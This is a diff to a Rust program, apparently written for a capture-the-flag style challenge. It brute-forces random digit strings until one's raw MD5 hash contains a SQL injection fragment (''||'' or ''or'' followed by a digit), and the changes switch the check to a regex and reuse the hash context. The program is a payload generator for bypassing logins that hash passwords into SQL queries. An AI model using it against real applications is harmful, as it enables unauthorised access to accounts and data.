@@ -2,21 +2,21 @@
 #![warn(clippy::pedantic)]
 #![warn(clippy::nursery)]
 
-use std::borrow::Cow;
-
+use once_cell::sync::Lazy;
 use openssl::{md::Md, md_ctx::MdCtx};
 use rand::{distributions, thread_rng, Rng};
+use regex::bytes::Regex;
+
+type Digest = [u8; 32];
+
+/// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
+/// This is significantly faster than the previous string search method.
+// TODO: Find how stop this from being SYNC, as taking the lock wastes a lot of time.
+static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'\d").unwrap());
 
 #[inline]
-fn validate(str_digest: &str) -> bool {
-    if let Some(sub) = str_digest.find("'||'").or_else(|| str_digest.find("'or'")) {
-        if let Some(eval) = str_digest[sub..].chars().nth(4) {
-            if eval > '0' && eval < '9' {
-                return true;
-            }
-        }
-    }
-    false
+fn byte_validate(digest: &Digest) -> bool {
+    INJECTION_REGEX.is_match(digest)
 }
 
 // 87153179503375488964249572016766023268706569805029887102402011499288342510775092757977654940386142689199562616975803271832089582121260280598138107679172885818920928633840231384484533108096150415512236913966
@@ -26,17 +26,16 @@ fn main() {
 }
 
 fn crack() {
+    // Create all in memory objects here to reduce re-allocation.
     let mut i = 0;
     let mut buf = String::with_capacity(400);
-    let mut digest = [0; 32];
+    let mut digest: Digest = [0; 32];
     // Ascii codes for digits.
     let uniform_ascii_digits = distributions::Uniform::from(48..=57);
+    let mut ctx = MdCtx::new().unwrap();
     // Distribution for selecting random
-    let uniform_take_range = distributions::Uniform::from(1..=4);
     loop {
-        if i % 10000 == 0 {
-            #[cfg(debug_assertions)]
-            println!("{buf}");
+        if i % 1_000_000 == 0 {
             println!("i = {i}");
         }
 
@@ -52,12 +51,6 @@ fn crack() {
         i += 1;
 
         // Push new string to buf
-        // thread_rng()
-        //     .sample_iter(uniform_ascii_digits)
-        //     .take(thread_rng().sample(uniform_take_range))
-        //     .filter_map(char::from_u32)
-        //     .for_each(|ch| buf.push(ch));
-
         unsafe {
             buf.push(char::from_u32_unchecked(
                 thread_rng().sample(uniform_ascii_digits),
@@ -65,12 +58,14 @@ fn crack() {
         }
 
         // Calculate md5 hash
-        let str_digest = openssl_str_digest(&buf, &mut digest);
+        // let str_digest = openssl_str_digest(&buf, &mut digest);
+        openssl_digest(&mut ctx, &buf, &mut digest);
 
         // Check if we can create the OR statement from it.
-        if validate(&str_digest) {
+        if byte_validate(&digest) {
             println!("Found! i = {i}");
             println!("Content = {buf}");
+            let str_digest = String::from_utf8_lossy(&digest);
             println!("Raw md5 Hash = {str_digest}");
             return;
         }
@@ -78,13 +73,10 @@ fn crack() {
 }
 
 #[inline]
-fn openssl_str_digest<'a>(buf: &str, digest: &'a mut [u8; 32]) -> Cow<'a, str> {
-    let mut ctx = MdCtx::new().unwrap();
+fn openssl_digest(ctx: &mut MdCtx, buf: &str, digest: &mut [u8; 32]) {
     ctx.digest_init(Md::md5()).unwrap();
     ctx.digest_update(buf.as_bytes()).unwrap();
     ctx.digest_final(digest).unwrap();
-
-    String::from_utf8_lossy(digest)
 }
 
 #[test]
@@ -93,12 +85,10 @@ fn test_validation() {
 
     let mut digest = [0; 32];
     let mut ctx = MdCtx::new().unwrap();
-    ctx.digest_init(Md::md5()).unwrap();
-    ctx.digest_update(buf.as_bytes()).unwrap();
-    ctx.digest_final(&mut digest).unwrap();
 
-    let str_digest = openssl_str_digest(buf, &mut digest);
+    openssl_digest(&mut ctx, buf, &mut digest);
 
+    let str_digest = String::from_utf8_lossy(&digest);
     println!("{str_digest}");
-    assert!(validate(&str_digest));
+    assert!(byte_validate(&digest));
 }
